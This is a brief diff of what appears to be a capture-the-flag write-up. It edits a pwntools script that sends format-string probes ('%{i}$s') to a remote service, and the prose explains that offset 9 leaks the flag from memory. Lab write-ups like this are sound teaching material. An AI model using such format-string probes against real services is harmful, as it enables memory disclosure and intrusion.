@@ -13,7 +13,7 @@ for i in range(1, 16):
     try:
         #p = process("./main")
         p = remote(host, port)
-        payload = f'%{i}$x\n'
+        payload = f'%{i}$s\n'
         p.sendline(payload.encode())
         response = p.recvall().decode().strip()
         print(f"Position {i:2}: {response}")
@@ -23,6 +23,7 @@ for i in range(1, 16):
 ```
 Now that we’ve identified %9$s as the offset pointing to the flag’s location in memory, we can craft a payload to directly leak the flag. Here’s the workflow:
 ```Python
+#KOOOuull w Wakkell_
 from pwn import *
 binary = './main'
 elf = ELF(binary)
